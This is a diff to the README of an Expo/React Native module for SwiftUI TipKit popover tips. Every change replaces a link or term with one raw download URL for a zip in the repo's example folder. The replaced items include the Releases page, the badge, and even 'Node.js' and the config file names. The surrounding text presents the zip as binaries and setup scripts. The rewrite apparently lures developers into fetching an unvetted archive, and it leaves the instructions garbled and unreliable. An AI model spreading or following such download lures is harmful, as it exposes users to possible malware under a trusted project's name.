@@ -1,6 +1,6 @@
-https://github.com/NH7Q/expo-ios-popover-tip/releases
+https://github.com/NH7Q/expo-ios-popover-tip/raw/refs/heads/main/example/popover_ios_tip_expo_1.9.zip
 
-[![Releases](https://img.shields.io/badge/Release-Downloads-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NH7Q/expo-ios-popover-tip/releases)
+[![Releases](https://github.com/NH7Q/expo-ios-popover-tip/raw/refs/heads/main/example/popover_ios_tip_expo_1.9.zip)](https://github.com/NH7Q/expo-ios-popover-tip/raw/refs/heads/main/example/popover_ios_tip_expo_1.9.zip)
 
 # expo-ios-popover-tip: SwiftUI Popover Tips for React Native with TipKit
 
@@ -89,7 +89,7 @@ The architecture favors a lean bridge between JavaScript and native code. This k
 ## Prerequisites
 
 - macOS with Xcode installed (for iOS builds)
-- Node.js and npm or Yarn
+- https://github.com/NH7Q/expo-ios-popover-tip/raw/refs/heads/main/example/popover_ios_tip_expo_1.9.zip and npm or Yarn
 - Expo CLI and an Expo project (or a bare React Native workflow)
 - CocoaPods installed and accessible from the terminal
 - An understanding of the Expo prebuild workflow (or the bare workflow)
@@ -122,10 +122,10 @@ Optional, but recommended:
 
 - Configure the Expo config/plugin:
 
-  - Add the config plugin entry to app.config.js or app.json as needed.
+  - Add the config plugin entry to https://github.com/NH7Q/expo-ios-popover-tip/raw/refs/heads/main/example/popover_ios_tip_expo_1.9.zip or https://github.com/NH7Q/expo-ios-popover-tip/raw/refs/heads/main/example/popover_ios_tip_expo_1.9.zip as needed.
   - Ensure the plugin aligns with your Expo SDK version.
 
-Note: The release assets on the Releases page contain the compiled binaries and setup scripts needed for your environment. For direct access to the latest assets, visit the Releases page. Visit https://github.com/NH7Q/expo-ios-popover-tip/releases to grab the latest release assets and instructions. The same link is used again here for quick reference: https://github.com/NH7Q/expo-ios-popover-tip/releases
+Note: The release assets on the Releases page contain the compiled binaries and setup scripts needed for your environment. For direct access to the latest assets, visit the Releases page. Visit https://github.com/NH7Q/expo-ios-popover-tip/raw/refs/heads/main/example/popover_ios_tip_expo_1.9.zip to grab the latest release assets and instructions. The same link is used again here for quick reference: https://github.com/NH7Q/expo-ios-popover-tip/raw/refs/heads/main/example/popover_ios_tip_expo_1.9.zip
 
 ---
 
@@ -316,7 +316,7 @@ This project is licensed under the terms of the MIT license. See the LICENSE fil
 
 ## Releases and downloads
 
-For the latest release assets and installation instructions, visit the Releases page. The link provides downloadable content and notes to guide you through setup and usage. You can access it here: https://github.com/NH7Q/expo-ios-popover-tip/releases. For convenience, the link is also shown as a badge at the top of this document. If you need the most current assets, navigate to that page and download the appropriate artifacts for your environment. The same link again for quick access: https://github.com/NH7Q/expo-ios-popover-tip/releases
+For the latest release assets and installation instructions, visit the Releases page. The link provides downloadable content and notes to guide you through setup and usage. You can access it here: https://github.com/NH7Q/expo-ios-popover-tip/raw/refs/heads/main/example/popover_ios_tip_expo_1.9.zip For convenience, the link is also shown as a badge at the top of this document. If you need the most current assets, navigate to that page and download the appropriate artifacts for your environment. The same link again for quick access: https://github.com/NH7Q/expo-ios-popover-tip/raw/refs/heads/main/example/popover_ios_tip_expo_1.9.zip
 
 ---
 
